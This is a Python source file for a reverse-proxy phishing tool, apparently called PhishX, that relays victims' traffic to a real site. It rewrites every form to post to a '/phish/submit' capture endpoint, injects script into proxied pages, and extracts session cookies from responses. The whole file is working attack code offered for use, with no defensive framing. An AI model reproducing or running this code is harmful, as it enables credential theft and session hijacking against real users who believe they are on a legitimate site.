import requests
from urllib.parse import urljoin, urlparse
from flask import Response, request
from bs4 import BeautifulSoup

class ReverseProxy:
    """Advanced reverse proxy for phishing campaigns"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def handle_request(self, flask_request, target_url):
        """Handle reverse proxy request"""
        try:
            # Prepare request
            method = flask_request.method
            headers = dict(flask_request.headers)
            
            # Remove problematic headers
            headers.pop('Host', None)
            headers.pop('Content-Length', None)
            
            # Make request to target
            if method == 'GET':
                response = self.session.get(target_url, headers=headers, allow_redirects=False)
            elif method == 'POST':
                data = flask_request.get_data()
                response = self.session.post(target_url, data=data, headers=headers, allow_redirects=False)
            else:
                response = self.session.request(method, target_url, headers=headers, allow_redirects=False)
            
            # Process response
            content = response.content
            
            # Inject JavaScript for credential capture if HTML
            if 'text/html' in response.headers.get('Content-Type', ''):
                content = self.inject_capture_script(content.decode('utf-8', errors='ignore'))
                content = content.encode('utf-8')
            
            # Create Flask response
            flask_response = Response(
                content,
                status=response.status_code,
                headers=dict(response.headers)
            )
            
            return flask_response
            
        except Exception as e:
            print(f"[PROXY] Error: {e}")
            return Response("Proxy error", status=500)
    
    def inject_capture_script(self, html_content):
        """Inject JavaScript for form capture"""
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Find forms and add capture functionality
            forms = soup.find_all('form')
            for form in forms:
                # Modify form action to point to our capture endpoint
                form['action'] = '/phish/submit'
                form['method'] = 'POST'
                
                # Add hidden field for campaign tracking
                hidden_input = soup.new_tag('input', type='hidden', name='original_action', value=form.get('action', ''))
                form.append(hidden_input)
            
            # Inject capture script
            script = soup.new_tag('script')
            script.string = """
            // PhishX capture script
            document.addEventListener('DOMContentLoaded', function() {
                const forms = document.querySelectorAll('form');
                forms.forEach(form => {
                    form.addEventListener('submit', function(e) {
                        // Log form submission
                        console.log('Form submitted');
                    });
                });
            });
            """
            
            if soup.body:
                soup.body.append(script)
            
            return str(soup)
            
        except Exception as e:
            print(f"[PROXY] Script injection error: {e}")
            return html_content
    
    def capture_cookies(self, response_headers):
        """Extract and log cookies from response"""
        cookies = {}
        
        set_cookie_headers = response_headers.get_all('Set-Cookie')
        if set_cookie_headers:
            for cookie_header in set_cookie_headers:
                # Parse cookie
                parts = cookie_header.split(';')[0].split('=', 1)
                if len(parts) == 2:
                    name, value = parts
                    cookies[name.strip()] = value.strip()
        
        return cookies
